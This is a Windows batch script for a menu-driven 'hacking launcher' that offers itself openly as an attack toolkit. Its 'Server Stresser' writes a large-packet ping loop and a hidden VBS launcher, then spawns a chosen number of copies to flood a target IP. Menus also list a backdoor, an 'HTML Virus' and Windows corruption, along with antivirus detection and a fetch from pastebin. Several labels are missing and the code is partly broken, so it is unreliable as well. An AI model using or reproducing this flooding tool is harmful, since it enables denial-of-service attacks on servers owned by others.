@echo off
title D3ADSPACE Launcher
:RootStart
SETLOCAL EnableDelayedExpansion
NET SESSION >nul 2>&1
if %errorlevel% EQU 0 set/a Admin=1
cls
COLOR 2
set CurrentDir=%cd%
SetLocal EnableDelayedExpansion
set Version=1.0.1.8
set/a Admin=0
set/a SafeMode=0
set/a ObjectMissing=0
set/a EmergCounter=3
set Core=%Userprofile%\Appdata\Roaming
set Root=%Core%\D3ADSPACE
set/a RootUser=0
cd %Core%
if exist D3ADSPACE goto BOOTCHECK_INSTALL_COMP
if not exist D3ADSPCAE goto BOOTCHECK_INSTALL_FAIL

:BOOTCHECK_INSTALL_FAIL
:NOT_INSTALLED
echo.
echo D3ADSPCACE is not installed!
echo.
echo [Offline Installation]
echo.
set/p Que=Do you want to install this application[Y/N]
if %Que%==y goto INSTALL_APP
if %Que%==n exit

:INSTALL_APP
cd %Core%
md D3ADSPACE
cd %Root%
md Downloaded
md Temp
ECHO -------CACHE FILE------- >> Cache.config
echo ----MAIN---- >> Settings.config
echo. >> Settings.config
echo KasperskyBootCheck=1 >> Settings.config
echo ----ENCRYPT---- >> Settings.config
echo SaveLogs=1 >> Settings.config
md EncryptionLogs
md AppLock
cd %Root%\AppLock
echo 3 > AppLock.txt
if %Errorlevel%==0 goto Install_Succes
echo.
echo Install Application Error.
pause> nul
exit
:Install_Succes
cls
echo.
echo Application Succesfully Installed!
echo.
pause> nul
cls
goto BOOTCHECK_INSTALL_COMP

:BOOTCHECK_INSTALL_COMP
:BOOTCHECK-FILE_CHECK
cd %Core%
if not exist D3ADSPACE set/a ObjectMissing+=1
if %ObjectMissing% GEQ 1 goto BOOTCHECK_CRIT
cd %Root%
if not exist Downloaded set/a ObjectMissing+=1
if not exist Temp set/a ObjectMissing+=1
if not exist Settings.config set/a ObjectMissing+=1
if not exist Cache.config set/a ObjectMissing+=1
if not exist EncryptionLogs set/a ObjectMissing+=1
if not exist AppLock set/a ObjectMissing+=1
cd %Root%\AppLock
if not exist AppLock.txt set/a ObjectMissing+=1
if %ObjectMissing% GEQ 1 goto BOOTCHECK_CRIT
if %ObjectMissing==0 GOTO BOOTCHECK_SET_VARI

:BOOTCHECK_CRIT
if %ObjectMissing%==0 goto BOOTCHECK_SET_VARI
cls
echo.
echo Application Failed to Start Correctly!
echo.
if %ObjectMissing%==1 echo ERROR_LEVEL=LOW
if %ObjectMissing%==2 echo ERROR_LEVEL=MEDIUM
if %ObjectMissing% GEQ 3 echo ERROR_LEVEL=CRITICAL
echo.
echo Missing Files = [%ObjectMissing%]
echo.
echo Click enter to enter safemode
pause> nul
goto APP_SAFEMODE

:BOOTCHECK_SET_VARI
cd %Root%\AppLock
set /p LockCounter=<AppLock.txt
if %LockCounter% LSS 1 goto APPLICATION-LOCKDOWN
color 2
:BOOTCHECK
cd %tmp%
if exist D3ADSPACE goto BOOTCHECK_ROOT
goto BOOTCHECK_CONTIN

:APPLICATION-LOCKDOWN
cd %Root%\Downloaded
DEL /Q *.*
:APPLICATION-LOCKDOWN-MAIN
if %EmergCounter%==0 DEL /Q %CurrentDir%\%~n0%~x0
color c
echo.
echo General Lockdown Active
echo ----------------------------
echo CURRENT_LOCKOUT_CHANGES=[%LockCounter%]
echo EMERGENCY_PASSWORD_ATTEMPS=[%EmergCounter%]
echo.
echo To Continue To Use this application please enter emergency password
echo.
set/p UnlockPass=Please enter emergency password:
if %UnlockPass%==JesseTimo79# goto APPLICATION-UNLOCK
if %UnlockPass%==else goto APPLICATION-LOCKDOWN-ERR

:APPLICATION-LOCKDOWN-ERR
cls
echo.
echo Emergency Password Wrong!
pause
set/a EmergCounter-=1
goto APPLICATION-LOCKDOWN-MAIN

:APPLICATION-UNLOCK
cd %Root%\AppLock
echo.
color 2
echo 3 > AppLock.txt
echo Application Unlocked!
pause> nul
goto RootStart

:BOOTCHECK_ROOT
cd %tmp%\D3ADSPACE
if not exist Token.config echo Error Whilst Gathering Root Permissions ["Fix Application" Will help the problem]
if exist Token.config goto BOOTCHECK_TOKEN
pause> nul
goto BOOTCHECK_CONTIN

:BOOTCHECK_TOKEN
findstr "RootUserToken" Token.config>NUL
if errorlevel 1 goto BOOTCHECK_TOKEN_INVALID
if errorlevel 0 goto BOOTCHECK_TOKEN_VALID
pause> nul
goto BOOTCHECK_CONTIN

:BOOTCHECK_TOKEN_VALID
set/a RootUser=1
goto BOOTCHECK_CONTIN

:BOOTCHECK_TOKEN_INVALID
echo Error Invalid Token Information ["Fix Application" Will help the problem]
set/a RootUser=0
goto BOOTCHECK_CONTIN

:BOOTCHECK_CONTIN
:BOOTCHECK_LOAD_SCRIPTS
cd %Root%\Downloaded
set H3LTHSTAT=
if exist H3LTH.INSUR3NCE.bat set H3LTHSTAT=Downloaded
if not exist H3LTH.INSUR3NCE.bat set H3LTHSTAT=Not_Downloaded
set HTMLSTAT=
if exist index.html set HTMLSTAT=Downloaded
if not exist index.html set HTMLSTAT=Not_Downloaded
cd %Core%
if exist D3ADSPACE goto AV_CHK
if not exist D3ADSPACE goto NOT_INSTALLED
cls
echo.
echo Application Error.
pause> nul
exit

:AV_CHK-WARNING
cd %root%
echo.
echo Warning, you have recently turned off Kaspersky Boot Checks if you own this av this file will be detected as a virus. This waring only shows once!
echo KasperskyBootRead >> Cache.config
pause> nul
goto AV_CHK-Y

:AV_CHK
cd %root%
findstr "KasperskyBootCheck=0" Settings.config>NUL
if errorlevel 0 goto AV_CHK-CACHE
if errorlevel 1 goto av_chk-contin
:AV_CHK-CACHE
findstr "KasperskyBootRead" Cache.config>NUL
if errorlevel 1 goto AV_CHK-WARNING
if errorlevel 0 goto IP_CHECK
cls
:av_chk-contin
set/a av=0
echo.
tasklist /fi "ImageName eq avp.exe" /fo csv 2>NUL | find /I "avp.exe">NUL
if "%ERRORLEVEL%"=="0" set/a av+=1
if %av%==0 goto IP_CHECK
echo Warning Kaspersky AV is running, When attempting to get a IP verification kaspersky will flag out
echo servers as a malicious site!
echo.
set/p que=Do you want to put in master password manually?[Y/N]
if %que%==y goto AV_CHK-Y
if %que%==n goto AV_CHK

:AV_CHK-Y
goto MasterPass

:IP_CHECK
cls
echo.
Ping www.google.com -n 1 -w 1000>NUL
if errorlevel 1 goto IP_CHECK_NO-INT
if errorlevel 0 goto IP_CHK-SERVER

:IP_CHK-SERVER
cd %Root%\Temp
cls
echo.
echo Verifying IP Data with Database...
SetLocal EnableDelayedExpansion
powershell -Command "Invoke-WebRequest https://pastebin.com/raw/uVcQzu4T -Outfile MasterPassIP.cc"
Set count=1
For /f "Usebackq tokens=*" %%A in ("MasterPassIP.cc") do (
	if !count! EQU 1 (set MasterPass=%%A)
	set /a count+=1
)
for /f "tokens=1-2 delims=:" %%c in ('ipconfig^|find "IPv4"') do set ip=%%d
set ip=%ip:~1%>NUL
findstr %ip% MasterPassIP.cc>NUL
if %errorlevel% equ 0 goto IP_CHECK_NO-INT-SUC
if %errorlevel% equ 1 goto IP_CHK-SERVER-NEG

:IP_CHK-SERVER-NEG
cls
echo.
echo Oops...We didn't found your ip in our database!
echo.
ECHO Your IP: %IP%
:MasterPass
echo.
SET/P OPT=Please enter Master Root Password:
if %OPT%==999933-3201 goto Start
if %OPT%==else goto IP_CHK-SERVER-ERR
if errorlevel 0 goto IP_CHK-SERVER-ERR

:IP_CHK-SERVER-ERR
cd %Root%\AppLock
set/a NewLockValue=%LockCounter%-1
echo %NewLockValue% > AppLock.txt
cls
echo.
echo ERROR Master Password Wrong!
echo.
pause> nul
exit

:IP_CHECK_NO-INT
cls
echo.
echo No Internet Connection...IP Verification failed!
echo.
SET/P OPT=Please select the Master Password=
if %OPT%==999933-3201 goto IP_CHECK_NO-INT-SUC
if %OPT%==else goto IP_CHECK_NO-INT-NO
if errorlevel 1 goto IP_CHECK_NO-INT-NO

:IP_CHECK_NO-INT-NO
cd %Root%\AppLock
set/a  NewLockValue=%LockCounter%-1
echo %NewLockValue% > AppLock.txt
cls
echo.
echo Master Password Incorrect!
echo.
pause> nul
exit

:IP_CHECK_NO-INT-SUC
cls
DEL /Q MasterPassIP.cc
echo.
echo Opening D3ADSPACE Launcher...
goto START

:START
title D3ADSPACE Home Page
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
if %RootUser% equ 1 echo Root User Activated [Admin Tools Available]
echo.
ECHO 1 - Download Manager
ECHO 2 - Server Stresser
ECHO 3 - Tools
ECHO 4 - Repair/Uninstal
ECHO 5 - Exit
if %RootUser%==1 echo.
if %RootUser%==1 ECHO 3202 - Admin Tools (Root Only)
echo.
set/p opt=Please select an option:
if %OPT%==1 GOTO Download_Man
if %OPT%==2 GOTO Stresser-Menu
if %OPT%==3 GOTO EXE-Menu
if %OPT%==4 GOTO REPUN
if %OPT%==3201 goto ADMIN_ACTIVATE
if %OPT%==3202 goto ADMIN_TOOLS_CHK
if %OPT%==9993 goto APP_SAFEMODE
if %OPT%==5 exit
if %OPT%==else goto ERROR404

:ERROR404
cls
echo.
echo General Error Code Screen
echo.
echo ERROR_CODE 404
echo.
echo Command: %OPT%
echo.
pause> nul
goto START

:ADMIN_TOOLS_CHK
if %RootUser%==1 goto ADMIN_TOOLS
if %RootUser%==0 echo Error Root Permissions Denied!
pause> nul
exit

:REPUN
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
ECHO 1 - Uninstall Components
ECHO 2 - Fix Application Error
ECHO 3 - Reset Admin Permissions
ECHO 4 - Return
echo.
set/p opt=Please select an option:
if %OPT%==1 goto UNINS
if %OPT%==2 goto FAE
if %OPT%==3 goto RAP-2
if %OPT%==4 goto START

:FAE
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
echo Setting Scan Variables...
set/a FolderError=0
set/a FileError=0
set/a MainFolderMissing=0
set/a DownloadFolderMissing=0
set/a RootTokenMissing=0
set/a TempFolderMissing=0
set/a RepairError=0
set/a LockFolderMissing=0
set/a LockValueMissing=0
set/a EncryptionLogsMissing=0
set/a CoreFileMissing=0
set/a CacheFileMissing=0
echo ------PHASE 1 COMPLETED-----
echo Scanning For Application Errors...
ping -n 4 127.0.0.1>nul
cd %Core% 
if not exist D3ADSPACE set/a FolderError+=1 && set/a MainFolderMissing=1
cd %Root%
if not exist Downloaded set/a FolderError+=1 && set/a DownloadFolderMissing=1
if not exist Temp set/a FolderError+=1 && set/a TempFolderMissing=1
if not exist EncryptionLogs set/a FolderError+=1 && set/a EncryptionLogsMissing=1
if not exist Cache.config set/a FileError+=1 && set/a CacheFileMissing=1
if not exist Settings.config set/a FileError+=1 && set/a CoreFileMissing=1
cd %Root%
if not exist AppLock set/a FolderError+=1 && set/a LockFolderMissing=1
cd %Root%\Applock
if %LockFolderMissing%==0 goto FAE-SCAN-APPLOCK
if %LockFolderMissing%==1 goto FAE-SCAN-CONTIN-TMP
:FAE-SCAN-APPLOCK
cd %Root%\AppLock
if not exist AppLock.txt set/a FileError+=1 && set/a LockValueMissing=1
:FAE-SCAN-CONTIN-TMP
cd %TMP%
if exist D3ADSPACE goto FAE-ADMIN-SCAN
if not exist D3ADSPACE goto FAE-SCAN-FINISHED

:FAE-ADMIN-SCAN
cd %TMP%\D3ADSPACE
if not exist Token.config set/a FileError+=1 && set/a RootTokenMissing=1
if %RootTokenMissing%==0 goto FAE-ADMIN-SCAN-TOKEN
if %RootTokenMissing%==1 goto FAE-SCAN-FINISHED

:FAE-ADMIN-SCAN-TOKEN
findstr "RootUserToken" Token.config>NUL
if errorlevel 1 set/a FileError+=1 && set/a RootTokenMissing=1
goto FAE-SCAN-FINISHED

:FAE-SCAN-FINISHED
set/a TotalErrors=%FolderError%+%FileError%
echo.
echo -----Scan Results----
echo Folder Errors Detected...[%FolderError%]
echo File Errors Detected...[%FileError%]
if %TotalErrors% GEQ 1 goto FAE-REPAIR-HUB
if %TotalErrors%==0 echo.
if %TotalErrors%==0 echo No Repairs Where Made!
if %SafeMode%==1 echo Click enter to restart application
pause> nul
if %SafeMode%==1 goto RootStart
goto REPUN

:FAE-REPAIR-HUB
if %MainFolderMissing%==1 goto FAE-REPAIR-MAIN
if %DownloadFolderMissing%==1 goto FAE-REPAIR-DOWN
if %TempFolderMissing%==1 goto FAE-REPAIR-TEMP
if %RootTokenMissing%==1 goto FAE-REPAIR-TOKEN
if %CoreFileMissing%==1 goto FAE-REPAIR-CORE_FILE
if %EncryptionLogsMissing%==1 goto FAE-REPAIR-ENCRYLOG
if %CacheFileMissing%==1 goto FAE-REPAIR-CACHE
if %LockFolderMissing%==1 goto FAE-REPAIR-LOCK
if %LockValueMissing%==1 goto FAE-REPAIR-LOCK_VAL
goto FAE-REPAIR-FIN

:FAE-REPAIR-CACHE
cd %root%
echo ------CACHE FILE------ > Cache.config
if not exist Cache.config set/a RepairError+=1
set/a CacheFileMissing=0
goto FAE-REPAIR-HUB

:FAE-REPAIR-CORE_FILE
CD %ROOT%
echo ----MAIN---- >> Settings.config
echo. >> Settings.config
echo KasperskyBootCheck=1 >> Settings.config
echo ----ENCRYPT---- >> Settings.config
echo SaveLogs=1 >> Settings.config
if not exist Settings.config set/a RepairError+=1
set/a CoreFileMissing=0
goto FAE-REPAIR-HUB

:FAE-REPAIR-ENCRYLOG
CD %Root%
md EncryptionLogs
if not exist EncryptionLogs set/a RepairError+=1
set/a EncryptionLogsMissing=0
goto FAE-REPAIR-HUB

:FAE-REPAIR-LOCK_VAL
cd %Root%\AppLock
echo 3 > AppLock.txt
if not exist AppLock.txt set/a RepairError+=1
set/a LockValueMissing=0
goto FAE-REPAIR-HUB

:FAE-REPAIR-LOCK
cd %Root%
md AppLock
if not exist AppLock set/a RepairError+=1 && goto FAE-REPAIR-ERROR
cd %Root%\AppLock
echo 3 > AppLock.txt
set/a LockFolderMissing=0
goto FAE-REPAIR-HUB

:FAE-REPAIR-TOKEN
cd %TMP%\D3ADSPACE
echo RootUserToken > Token.config
set/a RootTokenMissing=0
goto FAE-REPAIR-HUB

:FAE-REPAIR-TEMP
cd %Root%
md Temp
if not exist Temp set/a RepairError+=1
set/a TempFolderMissing=0
goto FAE-REPAIR-HUB

:FAE-REPAIR-DOWN
cd %Root%
md Downloaded
if not exist Downloaded set/a RepairError+=1
set/a DownloadFolderMissing=0
goto FAE-REPAIR-HUB

:FAE-REPAIR-FIN
if %RepairError%==0 echo Scan Finished --- [NO ERROR WHILST REPAIRING]
if %RepairError% GEQ 1 ECHO Scan Finished --- [%RepairError% ERRORS DETECTED WHILST REPAIRING]
pause> nul
goto REPUN

:FAE-REPAIR-ERROR
echo ----CRITICAL ERROR ENCOUNTERD SCAN & REPAIR ABORTERD----
goto FAE-REPAIR-FINISHED

:FAE-REPAIR-MAIN
cd %Core%
md D3ADSPACE
cd %Root%
md Temp
md Downloaded
if not exist Temp set/a RepairError+=1
if not exist Downloaded set/a RepairError+=1
set/a MainFolderMissing=0
set/a DownloadFolderMissing=0
set/a TempFolderMissing=0
goto FAE-REPAIR-HUB

:ADMIN_TOOLS
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
ECHO 1 - View Classified Data
ECHO 2 - Reset Admin Permissions
ECHO 3 - Corrupt Installation
ECHO 4 - Return
echo.
set/p opt=Please select an option:
if %OPT%==1 goto VCD
if %OPT%==2 goto RAP-2
if %OPT%==3 goto CI-ADMIN
if %OPT%==4 goto START

:CI-ADMIN
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
ECHO 1 - Delete All Subfolders
ECHO 2 - Spam Random Files
ECHO 3 - Delete Root Token
ECHO 4 - Return
echo.
set/p opt=Please select an option:
if %OPT%==1 GOTO DAS-ADMIN
if %OPT%==2 goto SRF-ADMIN
IF %OPT%==3 GOTO DRT-ADMIN
if %OPT%==4 goto ADMIN_TOOLS

:DAS-ADMIN
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
cd %Root%
rmdir /S /Q Downloaded
rmdir /s /q Temp
rmdir /s /q AppLock
echo Succesfully Deleted All Subfolders!
pause> nul
goto CI-ADMIN

:SRF-ADMIN
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
set/a SRFCounter=0
:SRF-ADMIN_HUB
set/a UselessBytes=0
if %SRFCounter%==0 cd %Root%
if %SRFCounter%==200 cd %Root%\Downloaded
if %SRFCounter%==300 cd %Root%\Temp
if %SRFCounter%==400 cd %Root%\AppLock
echo HC50C935YHFGRYF879R3FG934GYT947TYRF745YGF789RT4 >> SPAM_FILES_%RANDOM%
set/a UselessBytes=%SRFCounter%*47
title Data Created = %UselessBytes% --- Files Created = %SRFCounter%
echo %cd%\SPAM_FILES_%RANDOM% ------ Succesfully Generated
set/a SRFCounter+=1
if %SRFCounter%==501 goto SRF-ADMIN-COMP
goto SRF-ADMIN_HUB
:SRF-ADMIN-COMP
echo Completed Operation ----- DATA CREATED=%UselessBytes%
pause> nul
goto CI-ADMIN



:RAP-2
cls
echo.
cd %tmp%
RMDIR /S /Q D3ADSPACE
set/a RootUser=0
if exist D3ADSPACE echo Error While Resetting Permissions...
if not exist D3ADSPACE echo Succesfully Reset Admin Permissions
pause> nul
goto START

:ADMIN_ERROR_ROOT
echo Root Permissions Already Activated ----- [CURRENT ROOT STATUS=%RootUser%]
goto START

:ADMIN_ACTIVATE
if %RootUser%==1 goto ADMIN_ERROR_ROOT
cd %tmp%
md D3ADSPACE
cd %tmp%\D3ADSPACE
echo RootUserToken >> Token.config
if not exist Token.config echo Root Permission Token Failed To Initiate...
if exist Token.config goto ADMIN_ACTI
pause> nul
goto ADMIN_ACTI

:ADMIN_ACTI
set/a RootUser=1
goto START

:UNINS
cd %Core%
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
set/p que=Are you sure you want to delete all components?[Y/N]
if %Que%==y rmdir D3ADSPACE /s /q && goto UNINS-CHK
if %Que%==n goto Start

:UNINS-CHK
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
if exist D3ADSPACE echo Error, D3ADSPACE folder does still exist!
if not exist D3ADSPACE echo Succesfully deleted components!
echo.
pause
exit

:Stresser-Menu
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
ECHO 1 - Server Stresser
ECHO 2 - Repair Script
ECHO 3 - Return
echo.
set/p opt=Please select an option:
if %OPT%==1 goto Stresser
if %OPT%==2 goto RS-SS
if %OPT%==3 goto START

:RS-SS
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
:COUNTBOTS
taskkill /f /im PING.EXE>NUL
echo Closing Connection to Bots...
cd %Root%\Temp\Stresser
if exist Bot.bat DEL /Q Bot.bat && echo Deleting Bot Manager...
if exist Launcher.vbs DEL /Q Launcher.vbs && echo Deleting Launcher...
echo Repair / Cleanup Completed!
pause> nul
goto Stresser-Menu

:Stresser
cd %Root%\Temp
md Stresser
cd %Root%\Temp\Stresser
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo Router IP = 
echo.
set/p IP=Please enter Server IP:
echo.
set/p Multi=Please enter Bot amount:
echo Set oShell = CreateObject ("Wscript.Shell") >> Launcher.vbs
echo Dim strArgs >> Launcher.vbs
echo strArgs = "cmd /c Bot.bat" >> Launcher.vbs
echo oShell.Run strArgs, 0, false >> Launcher.vbs
echo PING -n 1 %IP% -l 65500 -t >> Bot.bat
set/a BotSpawn=0
:SPAWN_BOTS
if %BotSpawn%==%Multi% goto PING_SERVER
echo Flooding Server With %BotSpawn%/%Multi%...
set/a BotSpawn+=1
start Launcher.vbs
goto SPAWN_BOTS

:PING_SERVER
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
echo Server Status
echo =============================
:PING_SERVER-1
set/a IP_UP=0
set/a IP_DOWN=0
PING -n 1 %IP% -l 2-t>NUL
if ERRORLEVEL 0 set/a IP_UP=1
if ERRORLEVEL 1 set/a IP_DOWN=1
if %IP_UP% equ 1 echo Attacking Server...%IP% is still operational!
if %IP_DOWN% equ 1 echo Attacking Server...%ip% is not responding!
goto PING_SERVER-1


:EXE-Menu
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
ECHO 1 - Build-In Features
ECHO 2 - Downloaded Scripts
ECHO 3 - Return
echo.
set/p opt=Please select an option:
if %OPT%==1 goto BIF
if %OPT%==2 goto DS-EXE
if %OPT%==3 goto START

:DS-EXE
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
ECHO 1 - Manage Downloads
ECHO 2 - Start Tools
ECHO 3 - Return
echo.
set/p opt=Please select an option:
if %OPT%==1 goto MANAGE-DOWN
if %OPT%==2 goto START-TOOLS
if %OPT%==3 goto EXE-Menu

:MANAGE-DOWN
set/a HTML_Virus=0
set/a H3LTH=0
cls
cd %Root%\Downloaded
if %HTMLSTAT%==Downloaded set HTML_Virus=1
if %H3LTHSTAT%==Downloaded set H3LTH=1
set/a TotalDow=%H3LTH%+%HTML_Virus%
echo %TotalDow% Download(s) Detected!
echo.
ECHO 1 - H3LTH.INSUR3NCE [%H3LTHSTAT%]
ECHO 2 - HTML Virus [%HTMLSTAT%]
ECHO 3 - Return
echo.
set/p opt=Please select an option:
if %OPT%==1
if %OPT%==2
if %OPT%==3 goto DS-EXE


:BIF
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
ECHO 1 - Corrupt Windows Installation
ECHO 2 - B4ckD00R
ECHO 3 - Wifi Analyser
ECHO 4 - Port Opener
ECHO 5 - Encryptor/Decryptor [Custom Encryption]
ECHO 6 - Return
echo.
set/p opt=Please select an option:
if %OPT%==1 goto CWI-MENU-CHK
if %OPT%==2 goto Backdoor
if %OPT%==3 goto WA
if %OPT%==4 goto PP-Opener
if %OPT%==5 goto ED-CE
if %OPT%==6 goto EXE-Menu

:CWI-MENU-CHK
if %admin%==1 goto CWI-MENU
if %admin%==0 goto CWI-MENU-ADMINERROR

:ED-CE
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
ECHO 1 - Encryptor
ECHO 2 - Decryptor
ECHO 3 - Settings
ECHO 4 - Return
echo.
set/p opt=Please select an option:
if %OPT%==1 goto ENCRY
if %OPT%==2 goto DECRY
if %OPT%==3 goto ED-SETTINGS
if %OPT%==4 goto BIF

:GENERAL-SETTINGS
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
rem powershell -Command "(gc Settings.config) -replace 'foo', 'bar' | Out-File Settings.config"

:ED-SETTINGS

:ENCRY
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
setlocal  ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
title Encrypt
color a
:encry-loop
set savefile=on
::set Encrypt=Nothing
(set CHAR[a]=UDFM45) & (set CHAR[b]=H21DGF) & (set CHAR[c]=FDH56D) & (set CHAR[d]=FGS546) & (set CHAR[e]=JUK4JH)
(set CHAR[f]=ERG54S) & (set CHAR[g]=T5H4FD) & (set CHAR[h]=RG641G) & (set CHAR[i]=RG4F4D) & (set CHAR[j]=RT56F6)
(set CHAR[k]=VCBC3B) & (set CHAR[l]=F8G9GF) & (set CHAR[m]=FD4CJS) & (set CHAR[n]=G423FG) & (set CHAR[o]=F45GC2)
(set CHAR[p]=TH5DF5) & (set CHAR[q]=CV4F6R) & (set CHAR[r]=XF64TS) & (set CHAR[s]=X78DGT) & (set CHAR[t]=TH74SJ)
(set CHAR[u]=BCX6DF) & (set CHAR[v]=FG65SD) & (set CHAR[w]=4KL45D) & (set CHAR[x]=GFH3F2) & (set CHAR[y]=GH56GF)
(set CHAR[z]=45T1FG) & (set CHAR[1]=D4G23D) & (set CHAR[2]=GB56FG) & (set CHAR[3]=SF45GF) & (set CHAR[4]=P4FF12)
(set CHAR[5]=F6DFG1) & (set CHAR[6]=56FG4G) & (set CHAR[7]=USGFDG) & (set CHAR[8]=FKHFDG) & (set CHAR[9]=IFGJH6)
(set CHAR[0]=87H8G7) & (set CHAR[@]=G25GHF) & (set CHAR[#]=45FGFH) & (set CHAR[$]=75FG45) & (set CHAR[*]=54GDH5)
(set CHAR[(]=45F465) & (set CHAR[.]=HG56FG) & (set CHAR[,]=DF56H4) & (set CHAR[-]=F5JHFH) & (set CHAR[ ]=SGF4HF)
(set CHAR[\]=45GH45) & (set CHAR[/]=56H45G)
set/p Encrypt=Enter a string to encrypt:
cls
set Encrypt2=%Encrypt%
set "EncryptOut="
:encrypt2
set char=%Encrypt2:~0,1%
set Encrypt2=%Encrypt2:~1%
set EncryptOut=%EncryptOut%!CHAR[%char%]!
if not "%Encrypt2%"=="" goto encrypt2
echo Input string: %Encrypt%
echo.
echo Output string: %EncryptOut%
set string=%EncryptOut%
set temp_str=%string%
set str_len=0
:lengthloop1
if defined temp_str (
set temp_str=%temp_str:~1%
set /A str_len += 1
goto lengthloop1 )
echo.
echo Output string is %str_len% characters long!
cd %Root%\EncryptionLogs
if "%savefile%"=="on" echo.%EncryptOut%>> encrypted[%time%].txt
echo.
pause> nul
cls
goto ED-CE

:DECRY
cd %Root%\EncryptionLogs
:mainmenu
cls
echo.
echo +++++++++++++++++++++++++++++++++
echo + OFFICAL D3ADSPACE LAUNCHER    + 
echo + Version : [%Version%]           +
echo + AUTHOR == "Kartana Software"  +
echo +++++++++++++++++++++++++++++++++
echo.
set savefile=on
::set Decrypt=Nothing
(set CHAR[uDFM45]=a) & (set CHAR[H21DGF]=b) & (set CHAR[FDH56D]=c) & (set CHAR[FGS546]=d) & (set CHAR[JUK4JH]=e)
(set CHAR[ERG54S]=f) & (set CHAR[T5H4FD]=g) & (set CHAR[RG641G]=h) & (set CHAR[RG4F4D]=i) & (set CHAR[RT56F6]=j)
(set CHAR[VCBC3B]=k) & (set CHAR[F8G9GF]=l) & (set CHAR[FD4CJS]=m) & (set CHAR[G423FG]=n) & (set CHAR[F45GC2]=o)
(set CHAR[TH5DF5]=p) & (set CHAR[CV4F6R]=q) & (set CHAR[XF64TS]=r) & (set CHAR[X78DGT]=s) & (set CHAR[TH74SJ]=t)
(set CHAR[bCX6DF]=u) & (set CHAR[FG65SD]=v) & (set CHAR[4KL45D]=w) & (set CHAR[GFH3F2]=x) & (set CHAR[GH56GF]=y)
(set CHAR[45T1FG]=z) & (set CHAR[D4G23D]=1) & (set CHAR[GB56FG]=2) & (set CHAR[sF45GF]=3) & (set CHAR[P4FF12]=4)
(set CHAR[F6DFG1]=5) & (set CHAR[56FG4G]=6) & (set CHAR[uSGFDG]=7) & (set CHAR[FKHFDG]=8) & (set CHAR[iFGJH6]=9)
(set CHAR[87H8G7]=0) & (set CHAR[G25GHF]=@) & (set CHAR[45FGFH]=#) & (set CHAR[75FG45]=$) & (set CHAR[54GDH5]=*)
(set CHAR[45F465]=() & (set CHAR[HG56FG]=.) & (set CHAR[DF56H4]=,) & (set CHAR[F5JHFH]=-) & (set CHAR[sGF4HF]= )
